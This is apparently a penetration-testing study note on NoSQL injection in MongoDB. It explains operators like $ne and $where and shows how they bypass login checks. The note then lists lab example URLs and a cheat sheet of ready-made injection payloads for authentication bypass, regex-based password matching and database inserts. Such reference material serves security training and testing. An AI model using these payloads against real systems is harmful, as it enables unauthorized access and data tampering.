# NoSQLi

## NoSQLi

{% hint style="info" %}
NoSQL injection is a web security vulnerability that allows the attacker to have **control over the** **database**.

A NoSQL injection happens by sending queries via **untrusted** and **unfiltered** web application input, which leads to leaked unauthorized information.

In addition, the attacker can use the NoSQL injection to perform various operations such as **modifying data, escalating privileges, DoS attacks**, and others.
{% endhint %}

### Bypassing login pages

Connect to the database and then look for a certain **username : password** IF they exist in the collection (_in the database_), then we have a valid entry.

The following is the query that is used in the web applications used on our login :

```sql
db.users.find({query})
db.users.findOne(query)
```

Functions where the query is JSON data that's send via the application :

```json
{"username": "admin", "password":"adminpass"}
```

**MongoDB operators heavily used in the injections :**

* `$eq` - matches records that equal to a certain value.
* `$ne` - matches records that are not equal to a certain value.
* `$gt` - matches records that are greater than a certain value.
* `$where` - matches records based on Javascript condition.
* `$exists` - matches records that have a certain field.
* `$regex` - matches records that satisfy certain regular expressions.

#### `$ne`

Inject a JSON objection **{"$ne": "XYZ"}** in the **password** field, and change the logic to become as follows :

```
# Similar to admin'--
# Ignores the password input
Instructing MongoDB to find a document (user) with a username equal to **admin** and his password is not equal to **xyz**, which turns this statement to TRUE because the admin's password is not xyz.
```

In the case, we wanted to log in to a system as another user who is not admin :

* _Instruct MongoDB to find a document that its username is not equal to admin and its password is not equal to xyz, which returns the statement as true._

![](<../../../.gitbook/assets/image (143).png>)

### Exploiting NoSQL injection

```bash
 http://example.thm.labs/search?username=admin&role[$ne]=user
 http://example.thm.labs/search?username=ben&role=user
 http://example.thm.labs/search?username[$ne]=ben&role=user
 
# On Login pages / search bars
admin' || 'a'=='a
```

#### MongoDB payloads

```plsql
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```
